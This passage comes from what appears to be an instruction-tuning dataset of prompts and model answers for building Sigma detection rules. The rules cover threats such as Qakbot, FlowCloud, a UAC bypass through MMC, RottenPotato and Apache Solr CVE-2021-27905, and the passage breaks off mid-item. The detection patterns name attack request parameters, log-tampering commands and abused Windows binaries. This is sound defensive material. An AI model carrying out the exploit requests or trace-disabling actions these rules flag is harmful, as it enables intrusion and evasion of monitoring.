      "answer": "In order to detect the execution of \"logman\" utility in order to disable or delete Windows trace sessions, you should: Monitor process creation events in Windows environments for the execution of \"logman.exe\". This detection focuses on instances where \"logman.exe\" is executed, specifically when its command line includes actions to \"stop\" or \"delete\" certain processes or services. Furthermore, it is important to watch for command-line invocations that attempt to manipulate or deactivate Windows trace sessions, especially those related to the Circular Kernel Context Logger, any event logs prefixed with \"EventLog-\", \"SYSMON TRACE\", or the \"SysmonDnsEtwSession\". The rule identifies these activities as potentially malicious due to their nature of disrupting trace and logging mechanisms which are vital for auditing and forensic analysis. It is worth noting that while this rule aims to capture malicious activity, there may be instances where legitimate administrative actions or installer tools perform similar operations. Therefore, such benign activities might trigger alerts and should be considered as possible false positives. The significance of detecting these actions is high, given their potential use in evading detection or hindering security investigations."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting FlowCloud malware from threat group TA410..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect FlowCloud malware from threat group TA410, you should monitor the Windows Registry for interactions with very specific keys. These interactions involve looking for any activities targeting the registry keys: 'HKLM\\HARDWARE\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}', 'HKLM\\HARDWARE\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}', and 'HKLM\\HARDWARE\\{2DB80286-1784-48b5-A751-B6ED1F490303}'. In addition to these specific keys, attention should also be given to any registry operations involving keys that begin with 'HKLM\\SYSTEM\\Setup\\PrintResponsor\\'. This approach is crucial in the effort to intercept and identify actions that could be related to the FlowCloud malware's operational footprint within an infected system. Given the critical nature of this detection, vigilance is advised, although one should be aware of the possibility of encountering unknown false positives during monitoring.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: registry_event\ndetection:\n    selection:\n        - TargetObject:\n            - 'HKLM\\HARDWARE\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}'\n            - 'HKLM\\HARDWARE\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}'\n            - 'HKLM\\HARDWARE\\{2DB80286-1784-48b5-A751-B6ED1F490303}'\n        - TargetObject|startswith: 'HKLM\\SYSTEM\\Setup\\PrintResponsor\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: registry_event\ndetection:\n    selection:\n        - TargetObject:\n            - 'HKLM\\HARDWARE\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}'\n            - 'HKLM\\HARDWARE\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}'\n            - 'HKLM\\HARDWARE\\{2DB80286-1784-48b5-A751-B6ED1F490303}'\n        - TargetObject|startswith: 'HKLM\\SYSTEM\\Setup\\PrintResponsor\\'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: critical\n",
      "question": "FlowCloud malware from threat group TA410.",
      "answer": "In order to detect FlowCloud malware from threat group TA410, you should monitor the Windows Registry for interactions with very specific keys. These interactions involve looking for any activities targeting the registry keys: 'HKLM\\HARDWARE\\{804423C2-F490-4ac3-BFA5-13DEDE63A71A}', 'HKLM\\HARDWARE\\{A5124AF5-DF23-49bf-B0ED-A18ED3DEA027}', and 'HKLM\\HARDWARE\\{2DB80286-1784-48b5-A751-B6ED1F490303}'. In addition to these specific keys, attention should also be given to any registry operations involving keys that begin with 'HKLM\\SYSTEM\\Setup\\PrintResponsor\\'. This approach is crucial in the effort to intercept and identify actions that could be related to the FlowCloud malware's operational footprint within an infected system. Given the critical nature of this detection, vigilance is advised, although one should be aware of the possibility of encountering unknown false positives during monitoring."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious network connections made by a well-known Windows binary run with no command line parameters.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious network connections made by a well-known Windows binary run with no command line parameters, you should monitor network connections from Windows systems for specific conditions. These include tracking connections initiated by the system where the process launching the connection ends with `\\regsvr32.exe`, `\\rundll32.exe`, or `\\dllhost.exe`. These executable files are legitimate Windows binaries but can be used maliciously to establish network connections.\n\nCriteria for detection include ensuring that the connection has been initiated (marked as 'true') and that the image or command line of the process initiating the connection ends with one of the mentioned executables. However, connections where these executables are run without any command line parameters should also be scrutinized. This is highlighted by filtering out instances where the command line parameter is either empty or null, suggesting that the executable was possibly invoked without any arguments, which is a common tactic used by attackers to avoid detection.\n\nGiven the high level of suspicion when these conditions are met, it is recommended to set the detection level to high due to the potential misuse of these Windows binaries in the facilitation of unauthorized network connections. Although some activities might be benign, leading to unknown false positives, the tags associated with this detection include tactics and techniques such as Execution, Persistence, Privilege Escalation, Defense Evasion, and potentially others directly related to the misuse of system utilities or binaries to achieve malicious objectives. \n\nThis method of detection is critical in identifying and mitigating threats that leverage legitimate system files for malicious network activities, thus enhancing the overall security posture against a variety of attack vectors.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        Image|endswith:\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\dllhost.exe'\n        CommandLine|endswith:\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\dllhost.exe'\n    filter_no_cmdline:\n        CommandLine: ''\n    filter_null: # e.g. Sysmon has no CommandLine field in network events with ID 3\n        CommandLine: null\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: network_connection\n    product: windows\ndetection:\n    selection:\n        Initiated: 'true'\n        Image|endswith:\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\dllhost.exe'\n        CommandLine|endswith:\n            - '\\regsvr32.exe'\n            - '\\rundll32.exe'\n            - '\\dllhost.exe'\n    filter_no_cmdline:\n        CommandLine: ''\n    filter_null: # e.g. Sysmon has no CommandLine field in network events with ID 3\n        CommandLine: null\n    condition: selection and not 1 of filter*\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "suspicious network connections made by a well-known Windows binary run with no command line parameters",
      "answer": "In order to detect suspicious network connections made by a well-known Windows binary run with no command line parameters, you should monitor network connections from Windows systems for specific conditions. These include tracking connections initiated by the system where the process launching the connection ends with `\\regsvr32.exe`, `\\rundll32.exe`, or `\\dllhost.exe`. These executable files are legitimate Windows binaries but can be used maliciously to establish network connections.\n\nCriteria for detection include ensuring that the connection has been initiated (marked as 'true') and that the image or command line of the process initiating the connection ends with one of the mentioned executables. However, connections where these executables are run without any command line parameters should also be scrutinized. This is highlighted by filtering out instances where the command line parameter is either empty or null, suggesting that the executable was possibly invoked without any arguments, which is a common tactic used by attackers to avoid detection.\n\nGiven the high level of suspicion when these conditions are met, it is recommended to set the detection level to high due to the potential misuse of these Windows binaries in the facilitation of unauthorized network connections. Although some activities might be benign, leading to unknown false positives, the tags associated with this detection include tactics and techniques such as Execution, Persistence, Privilege Escalation, Defense Evasion, and potentially others directly related to the misuse of system utilities or binaries to achieve malicious objectives. \n\nThis method of detection is critical in identifying and mitigating threats that leverage legitimate system files for malicious network activities, thus enhancing the overall security posture against a variety of attack vectors."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in, you should: Focus on monitoring process creation events within Windows environments. Specifically, look for processes that have been launched by the Microsoft Management Console (mmc.exe) where the command line used for launching involves the Windows Firewall snap-in (WF.msc). It is essential to exclude any instances where the process 'WerFault.exe' is launched in this manner, as these do not constitute part of the attack pattern. This approach aims at identifying malicious activities that could be leveraging the MMC with the Windows Firewall snap-in to bypass UAC, without being detected by standard security measures. Keep an eye out for any activity that meets these criteria, as they might not have known false positives, indicating a medium risk level of security threat due to this specific method of attack.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\mmc.exe'\n        ParentCommandLine|contains: 'WF.msc'\n    filter:\n        Image|endswith: '\\WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        ParentImage|endswith: '\\mmc.exe'\n        ParentCommandLine|contains: 'WF.msc'\n    filter:\n        Image|endswith: '\\WerFault.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in",
      "answer": "In order to detect attempts to bypass User Account Control (UAC) by hijacking the Microsoft Management Console (MMC) Windows Firewall snap-in, you should: Focus on monitoring process creation events within Windows environments. Specifically, look for processes that have been launched by the Microsoft Management Console (mmc.exe) where the command line used for launching involves the Windows Firewall snap-in (WF.msc). It is essential to exclude any instances where the process 'WerFault.exe' is launched in this manner, as these do not constitute part of the attack pattern. This approach aims at identifying malicious activities that could be leveraging the MMC with the Windows Firewall snap-in to bypass UAC, without being detected by standard security measures. Keep an eye out for any activity that meets these criteria, as they might not have known false positives, indicating a medium risk level of security threat due to this specific method of attack."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity, you should: \n\nFocus on monitoring Windows system logs, specifically those related to the creation of processes. Keep an eye out for instances where well-known system processes such as 'cmd.exe', 'cscript.exe', 'curl.exe', 'mshta.exe', 'powershell.exe', 'pwsh.exe', and 'wscript.exe' are parents to the 'rundll32.exe' process. This combination of parent and child processes is unusual under normal operation circumstances and has been associated with the behavior of the Qakbot malware. Additionally, pay attention to 'rundll32.exe' processes that originate with command lines containing specific paths known to be utilized by Qakbot, such as directories within 'ProgramData', 'Users\\Public', 'AppData\\Local\\Temp', and 'AppData\\Roaming'. \n\nMoreover, scrutinize the 'rundll32.exe' processes for command lines that end with particular exports indicative of Qakbot\u2019s malicious activities. These exports include, but are not limited to, 'aslr', 'bind', 'DrawThemeIcon', 'GG10', 'GL70', 'jhbvygftr', 'kjhbhkjvydrt', 'LS88', 'Motd', 'N115', 'next', 'Nikn', 'print', 'qqqb', 'qqqq', 'RS32', 'Test', 'Time', 'Updt', 'vips', 'Wind', 'WW50', 'X555', 'XL55', 'xlAutoOpen', and 'XS88'. \n\nThe detection of these paths and exports, especially when found in conjunction with each other, is critical. Spawning of 'rundll32.exe' with these peculiar characteristics is an indicator of compromise and suggests the presence of Qakbot malware within the system. Given the sophistication and potentially severe impact of a Qakbot infection, such detections are treated with a high level of suspicion, and the likelihood of false positives is considered low.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_paths:\n        ParentImage|endswith:\n            # Note: Only add processes seen used by Qakbot to avoid collision with other strains of malware\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains:\n            # Note: Only add paths seen used by Qakbot to avoid collision with other strains of malware\n            - ':\\ProgramData\\'\n            - ':\\Users\\Public\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n    selection_exports:\n        CommandLine|endswith:\n            # Note: Only add additional exports seen used by Qakbot\n            - 'aslr' # https://tria.ge/230524-scgq9add9v/behavioral1#report\n            - 'bind'\n            - 'DrawThemeIcon'\n            - 'GG10'\n            - 'GL70'\n            - 'jhbvygftr'\n            - 'kjhbhkjvydrt'\n            - 'LS88'\n            - 'Motd'\n            - 'N115'\n            - 'next' # https://tria.ge/230530-n3rxpahf9w/behavioral2\n            - 'Nikn'\n            - 'print'\n            - 'qqqb'\n            - 'qqqq'\n            - 'RS32'\n            - 'Test'\n            - 'Time'\n            - 'Updt'\n            - 'vips'\n            - 'Wind'\n            - 'WW50'\n            - 'X555'\n            - 'XL55'\n            - 'xlAutoOpen'\n            - 'XS88'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_paths:\n        ParentImage|endswith:\n            # Note: Only add processes seen used by Qakbot to avoid collision with other strains of malware\n            - '\\cmd.exe'\n            - '\\cscript.exe'\n            - '\\curl.exe'\n            - '\\mshta.exe'\n            - '\\powershell.exe'\n            - '\\pwsh.exe'\n            - '\\wscript.exe'\n        Image|endswith: '\\rundll32.exe'\n        CommandLine|contains:\n            # Note: Only add paths seen used by Qakbot to avoid collision with other strains of malware\n            - ':\\ProgramData\\'\n            - ':\\Users\\Public\\'\n            - '\\AppData\\Local\\Temp\\'\n            - '\\AppData\\Roaming\\'\n    selection_exports:\n        CommandLine|endswith:\n            # Note: Only add additional exports seen used by Qakbot\n            - 'aslr' # https://tria.ge/230524-scgq9add9v/behavioral1#report\n            - 'bind'\n            - 'DrawThemeIcon'\n            - 'GG10'\n            - 'GL70'\n            - 'jhbvygftr'\n            - 'kjhbhkjvydrt'\n            - 'LS88'\n            - 'Motd'\n            - 'N115'\n            - 'next' # https://tria.ge/230530-n3rxpahf9w/behavioral2\n            - 'Nikn'\n            - 'print'\n            - 'qqqb'\n            - 'qqqq'\n            - 'RS32'\n            - 'Test'\n            - 'Time'\n            - 'Updt'\n            - 'vips'\n            - 'Wind'\n            - 'WW50'\n            - 'X555'\n            - 'XL55'\n            - 'xlAutoOpen'\n            - 'XS88'\n    condition: all of selection_*\nfalsepositives:\n    - Unlikely\nlevel: critical\n",
      "question": "specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity.",
      "answer": "In order to detect specific process tree behavior of a \"rundll32\" execution with exports linked with Qakbot activity, you should: \n\nFocus on monitoring Windows system logs, specifically those related to the creation of processes. Keep an eye out for instances where well-known system processes such as 'cmd.exe', 'cscript.exe', 'curl.exe', 'mshta.exe', 'powershell.exe', 'pwsh.exe', and 'wscript.exe' are parents to the 'rundll32.exe' process. This combination of parent and child processes is unusual under normal operation circumstances and has been associated with the behavior of the Qakbot malware. Additionally, pay attention to 'rundll32.exe' processes that originate with command lines containing specific paths known to be utilized by Qakbot, such as directories within 'ProgramData', 'Users\\Public', 'AppData\\Local\\Temp', and 'AppData\\Roaming'. \n\nMoreover, scrutinize the 'rundll32.exe' processes for command lines that end with particular exports indicative of Qakbot\u2019s malicious activities. These exports include, but are not limited to, 'aslr', 'bind', 'DrawThemeIcon', 'GG10', 'GL70', 'jhbvygftr', 'kjhbhkjvydrt', 'LS88', 'Motd', 'N115', 'next', 'Nikn', 'print', 'qqqb', 'qqqq', 'RS32', 'Test', 'Time', 'Updt', 'vips', 'Wind', 'WW50', 'X555', 'XL55', 'xlAutoOpen', and 'XS88'. \n\nThe detection of these paths and exports, especially when found in conjunction with each other, is critical. Spawning of 'rundll32.exe' with these peculiar characteristics is an indicator of compromise and suggests the presence of Qakbot malware within the system. Given the sophistication and potentially severe impact of a Qakbot infection, such detections are treated with a high level of suspicion, and the likelihood of false positives is considered low."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting logon events that have characteristics of events generated during an attack with RottenPotato and the like.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect logon events that have characteristics of events generated during an attack with RottenPotato and the like, you should focus on monitoring security logs in Windows environments. Specifically, pay attention to events with an ID of 4624, which indicates a successful logon event. The logon type should be 3, signifying a network logon. Crucially, these events will have the target username set to 'ANONYMOUS LOGON', and the workstation name field will be empty, represented by a '-'. Additionally, the IP address associated with these events will be '127.0.0.1' or '::1', both of which indicate local host connections. This pattern of characteristics is commonly associated with malicious activities, including but not limited to the exploitation techniques used by tools like RottenPotato. It\u2019s also essential to note that while any occurrence of these specific patterns should be investigated, there might be legitimate but rare scenarios where similar patterns occur, leading to potential false positives. In cybersecurity, identifying and analyzing events with these attributes at a high level of scrutiny is vital for early detection of this kind of attack tactic.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 3\n        TargetUserName: 'ANONYMOUS LOGON'\n        WorkstationName: '-'\n        IpAddress: \n            - '127.0.0.1'\n            - '::1'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    product: windows\n    service: security\ndetection:\n    selection:\n        EventID: 4624\n        LogonType: 3\n        TargetUserName: 'ANONYMOUS LOGON'\n        WorkstationName: '-'\n        IpAddress: \n            - '127.0.0.1'\n            - '::1'\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: high\n",
      "question": "logon events that have characteristics of events generated during an attack with RottenPotato and the like",
      "answer": "In order to detect logon events that have characteristics of events generated during an attack with RottenPotato and the like, you should focus on monitoring security logs in Windows environments. Specifically, pay attention to events with an ID of 4624, which indicates a successful logon event. The logon type should be 3, signifying a network logon. Crucially, these events will have the target username set to 'ANONYMOUS LOGON', and the workstation name field will be empty, represented by a '-'. Additionally, the IP address associated with these events will be '127.0.0.1' or '::1', both of which indicate local host connections. This pattern of characteristics is commonly associated with malicious activities, including but not limited to the exploitation techniques used by tools like RottenPotato. It\u2019s also essential to note that while any occurrence of these specific patterns should be investigated, there might be legitimate but rare scenarios where similar patterns occur, leading to potential false positives. In cybersecurity, identifying and analyzing events with these attributes at a high level of scrutiny is vital for early detection of this kind of attack tactic."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting exploitation attempt of the CVE-2021-27905 which affects all Apache Solr versions prior to and including 8.8.1..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect exploitation attempts of the CVE-2021-27905, which affects all Apache Solr versions prior to and including 8.8.1, you should focus on monitoring the web server logs for specific request patterns. Look for HTTP requests that include query parameters indicating an attempt to exploit the vulnerability. Specifically, watch for two types of request patterns:\n\n1. Requests containing the '/solr/' path, the '/debug/dump?' directive, and the parameter 'param=ContentStream', which must also return an HTTP status code of 200, indicating a successful interaction with the server. This pattern suggests an attacker is attempting to debug or dump information from the Solr server using a crafted request.\n\n2. HTTP GET requests that contain the '/solr/' path, the 'command=fetchindex' instruction, and a 'masterUrl=' parameter. These requests also need to return an HTTP status code of 200. This pattern suggests an attempt to fetch the index from the Solr server, possibly indicating unauthorized data exfiltration or manipulation.\n\nIt's important to consider that vulnerability scanners might also trigger these patterns, so they should be carefully analyzed to differentiate between legitimate scanning activities and actual exploitation attempts. The detection of such requests should be treated with a medium level of concern, due to their potential indication of an ongoing attack targeting the known vulnerability CVE-2021-27905 in Apache Solr. Be sure to pay attention to both detection scenarios to effectively monitor and identify possible exploitation activities.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: webserver\ndetection:\n    selection_request1:\n        cs-uri-query|contains|all:\n            - '/solr/'\n            - '/debug/dump?'\n            - 'param=ContentStream'\n        sc-status: 200\n    selection_request2:\n        cs-method: 'GET'\n        cs-uri-query|contains|all:\n            - '/solr/'\n            - 'command=fetchindex'\n            - 'masterUrl='\n        sc-status: 200\n    condition: 1 of selection_*\nfalsepositives:\n    - Vulnerability Scanners\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: webserver\ndetection:\n    selection_request1:\n        cs-uri-query|contains|all:\n            - '/solr/'\n            - '/debug/dump?'\n            - 'param=ContentStream'\n        sc-status: 200\n    selection_request2:\n        cs-method: 'GET'\n        cs-uri-query|contains|all:\n            - '/solr/'\n            - 'command=fetchindex'\n            - 'masterUrl='\n        sc-status: 200\n    condition: 1 of selection_*\nfalsepositives:\n    - Vulnerability Scanners\nlevel: medium\n",
      "question": "exploitation attempt of the CVE-2021-27905 which affects all Apache Solr versions prior to and including 8.8.1.",
      "answer": "In order to detect exploitation attempts of the CVE-2021-27905, which affects all Apache Solr versions prior to and including 8.8.1, you should focus on monitoring the web server logs for specific request patterns. Look for HTTP requests that include query parameters indicating an attempt to exploit the vulnerability. Specifically, watch for two types of request patterns:\n\n1. Requests containing the '/solr/' path, the '/debug/dump?' directive, and the parameter 'param=ContentStream', which must also return an HTTP status code of 200, indicating a successful interaction with the server. This pattern suggests an attacker is attempting to debug or dump information from the Solr server using a crafted request.\n\n2. HTTP GET requests that contain the '/solr/' path, the 'command=fetchindex' instruction, and a 'masterUrl=' parameter. These requests also need to return an HTTP status code of 200. This pattern suggests an attempt to fetch the index from the Solr server, possibly indicating unauthorized data exfiltration or manipulation.\n\nIt's important to consider that vulnerability scanners might also trigger these patterns, so they should be carefully analyzed to differentiate between legitimate scanning activities and actual exploitation attempts. The detection of such requests should be treated with a medium level of concern, due to their potential indication of an ongoing attack targeting the known vulnerability CVE-2021-27905 in Apache Solr. Be sure to pay attention to both detection scenarios to effectively monitor and identify possible exploitation activities."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting flashplayer update from an unofficial location.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect a flashplayer update from an unofficial location, you should: Monitor proxy logs for specific patterns in URIs indicating an attempt to download Flash Player updates. Look for accesses to URLs containing '/flash_install.php' or ending with '/install_flash_player.exe'. These accesses suggest an attempt to install Flash Player, potentially mimicking a legitimate update mechanism. However, to accurately identify malicious activity, it's crucial to exclude any accesses to these resources hosted on domains ending with '.adobe.com', as this domain is associated with the legitimate Adobe Flash Player updates. The focus on excluding the official Adobe domain helps in reducing false positives, particularly concerning URLs that are not known locations for Flash Player downloads. The significance of this monitoring approach is heightened not only by the high level of risk associated with unauthorized Flash Player installations\u2014which could lead to malware infections or other security breaches\u2014but also categorizes the activity based on exploitation and possibly delivery of malicious payloads, considering it under tactics like execution, persistence, or privilege escalation if further leveraged by attackers.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: proxy\ndetection:\n    selection:\n        - c-uri|contains: '/flash_install.php'\n        - c-uri|endswith: '/install_flash_player.exe'\n    filter:\n        cs-host|endswith: '.adobe.com'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown flash download locations\nlevel: high\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: proxy\ndetection:\n    selection:\n        - c-uri|contains: '/flash_install.php'\n        - c-uri|endswith: '/install_flash_player.exe'\n    filter:\n        cs-host|endswith: '.adobe.com'\n    condition: selection and not filter\nfalsepositives:\n    - Unknown flash download locations\nlevel: high\n",
      "question": "flashplayer update from an unofficial location",
      "answer": "In order to detect a flashplayer update from an unofficial location, you should: Monitor proxy logs for specific patterns in URIs indicating an attempt to download Flash Player updates. Look for accesses to URLs containing '/flash_install.php' or ending with '/install_flash_player.exe'. These accesses suggest an attempt to install Flash Player, potentially mimicking a legitimate update mechanism. However, to accurately identify malicious activity, it's crucial to exclude any accesses to these resources hosted on domains ending with '.adobe.com', as this domain is associated with the legitimate Adobe Flash Player updates. The focus on excluding the official Adobe domain helps in reducing false positives, particularly concerning URLs that are not known locations for Flash Player downloads. The significance of this monitoring approach is heightened not only by the high level of risk associated with unauthorized Flash Player installations\u2014which could lead to malware infections or other security breaches\u2014but also categorizes the activity based on exploitation and possibly delivery of malicious payloads, considering it under tactics like execution, persistence, or privilege escalation if further leveraged by attackers."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications..\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect the execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications, you should: Monitor the creation processes on Windows systems for any instances where the process image ends with '\\clip.exe' or the original file name is identified as clip.exe. This observation aids in identifying potential malicious activity where adversaries attempt to leverage the clipboard utility (clip.exe) to illicitly gather and potentially exfiltrate sensitive information copied by users. This monitoring should be perceived as having a low level of alert due to the possibility of false positives, as the usage of clip.exe might not always be malicious. However, it remains an essential step in the broader scope of defending against data exfiltration techniques.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\clip.exe'\n        - OriginalFileName: clip.exe\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\clip.exe'\n        - OriginalFileName: clip.exe\n    condition: selection\nfalsepositives:\n    - Unknown\nlevel: low\n",
      "question": "execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications.",
      "answer": "In order to detect the execution of clip.exe in order to copy data to the clipboard. Adversaries may collect data stored in the clipboard from users copying information within or between applications, you should: Monitor the creation processes on Windows systems for any instances where the process image ends with '\\clip.exe' or the original file name is identified as clip.exe. This observation aids in identifying potential malicious activity where adversaries attempt to leverage the clipboard utility (clip.exe) to illicitly gather and potentially exfiltrate sensitive information copied by users. This monitoring should be perceived as having a low level of alert due to the possibility of false positives, as the usage of clip.exe might not always be malicious. However, it remains an essential step in the broader scope of defending against data exfiltration techniques."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting usage of an encoded/obfuscated version of an IP address (hex, octal...) via commandline.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect usage of an encoded/obfuscated version of an IP address (hex, octal...) via commandline, you should monitor the creation of processes on Windows systems. Specifically, focus on the execution of `ping.exe` and `arp.exe` commands. Look for command lines that contain IP addresses in either hexadecimal format (indicated by the presence of ' 0x') or octal format (numbers consisting of 7 to 13 digits). It's important to watch for both of these indicators in the command lines to catch attempts to obfuscate IP addresses using encoding techniques. The level of concern for these observations is considered medium, although it's acknowledged that there could be instances where these patterns occur and are not related to malicious activity.",
    "context": "",
    "output": "Ofcourse.\nHere is the requested Sigma rule:\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\ping.exe'\n            - '\\arp.exe'\n    selection_ip:\n        - CommandLine|contains: ' 0x' # For hex format\n        - CommandLine|re: ' [0-9]{7,13}' # For octal format\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
    "category": "SigmaFlan",
    "instruction_type": "sigma_rule_build",
    "parsed_raw_data": {
      "Sigma": "logsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        Image|endswith:\n            - '\\ping.exe'\n            - '\\arp.exe'\n    selection_ip:\n        - CommandLine|contains: ' 0x' # For hex format\n        - CommandLine|re: ' [0-9]{7,13}' # For octal format\n    condition: all of selection*\nfalsepositives:\n    - Unknown\nlevel: medium\n",
      "question": "usage of an encoded/obfuscated version of an IP address (hex, octal...) via commandline",
      "answer": "In order to detect usage of an encoded/obfuscated version of an IP address (hex, octal...) via commandline, you should monitor the creation of processes on Windows systems. Specifically, focus on the execution of `ping.exe` and `arp.exe` commands. Look for command lines that contain IP addresses in either hexadecimal format (indicated by the presence of ' 0x') or octal format (numbers consisting of 7 to 13 digits). It's important to watch for both of these indicators in the command lines to catch attempts to obfuscate IP addresses using encoding techniques. The level of concern for these observations is considered medium, although it's acknowledged that there could be instances where these patterns occur and are not related to malicious activity."
    }
  },
  {
    "instruction": "Build a Sigma rule with the goal of detecting suspicious new RUN key element pointing to an executable in a suspicious folder.\nMore specifically, the Sigma rule should work as follows:\n\nIn order to detect suspicious new RUN key element pointing to an executable in a suspicious folder, you should: Focus on monitoring Windows Registry operations specifically within the `registry_set` category with the product set to Windows. Pay attention to events where the type is `SetValue` indicating a value set operation on registry keys. Particularly, scrutinize changes to the `TargetObject` path to include elements related to startup execution paths such as `\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\` and `\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\`. This is critical as these registry paths are commonly used for programs that need to start automatically with Windows.\n\nAdditionally, examine the `Details` of the SetValue operation to identify if the executable or script is located in directories that are not typically used for such purposes, such as `C:\\Windows\\Temp\\`, `C:\\$Recycle.bin\\`, `C:\\Temp\\`, `C:\\Users\\Public\\`, `C:\\Users\\Default\\`, `C:\\Users\\Desktop\\`, `\\AppData\\Local\\Temp\\`, `%temp%\\`, and `%tmp%\\`. Also, be vigilant for `Details` that start with certain indicators like `%Public%\\`, and commands like `wscript` or `cscript` which are scripting tools that can be leveraged maliciously. \n\nMake sure to log and analyze the `Image` field for additional context on the executable or script that's being set to run at startup. Be aware of potential false positives that may arise from legitimate software that utilizes unconventional folders for updates or operations. The level of concern for such detections is considered high due to the typical misuse of these mechanisms by malicious actors for persistence, execution after reboot, or for launching attacks discreetly at system startup. This detection is aligned with MITRE ATT&CK tactics and techniques focusing on persistence and execution methods abused by adversaries.",
    "context": "",
